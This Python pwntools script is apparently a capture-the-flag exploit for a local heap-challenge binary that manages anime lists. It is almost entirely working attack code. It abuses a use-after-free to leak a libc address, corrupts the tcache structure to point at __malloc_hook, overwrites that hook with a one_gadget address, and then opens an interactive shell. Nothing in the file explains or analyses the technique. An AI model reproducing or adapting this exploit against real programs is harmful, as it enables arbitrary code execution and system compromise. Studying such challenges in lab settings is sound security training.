#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "./MAL"

IP = "localhost"
PORT = None

one_shots = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]
LINK_LIBC = True
LIBC = "./libc.so.6"
LD = "./ld-linux-x86-64.so.2"
GDBSCRIPT = """
"""

LOG_LEVEL = "CRITICAL"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

def create_list():
    r.sendlineafter(b"> ", b"1")

def del_list(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())

def add_anime(idx, title, desc, score):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", title)
    r.sendlineafter(b": ", desc)
    r.sendlineafter(b": ", str(score).encode())

def change_review(idx, title, desc):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", title)
    r.sendlineafter(b": ", desc)

def del_anime(idx, title):
    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", title)

def view_list(idx):
    r.sendlineafter(b"> ", b"6")
    r.sendlineafter(b": ", str(idx).encode())
    data = r.recvuntil(b"\n+-")[:-3]
    return data

# SPLOIT #

# make libc leak
create_list() # idx 0

for i in range(8):
    add_anime(0, b"test", b"test", 1)
for i in range(7):
    del_anime(0, b"test")

del_list(0)
buf = view_list(0).split(b'\n')[4].split(b": ")[1].ljust(8, b'\x00')
libc_leak = u64(buf)
libc_base = libc_leak - 0x1eabe0
print("[+] libc: ", hex(libc_base))

create_list() # idx 1
add_anime(1, b"list1", b"list1", 2)
del_list(1)
buf = view_list(1).split(b'\n')[3].split(b": ")[1]

# overwrite tcache struct
payload = p16(0x0) * 7 + p16(0x2) + p16(0x0) * 7 + p16(0x7)
payload += p64(0x0) * 19 + p64(libc_base + libc.symbols['__malloc_hook'] - 19)

change_review(1, buf, payload)
create_list() # idx 2 
add_anime(2, b"\x00" * 19 + p64(libc_base + one_shots[3]), b"kekw", 1337)

r.sendlineafter(b"> ", b"3")
r.sendlineafter(b": ", b"2")

r.interactive()
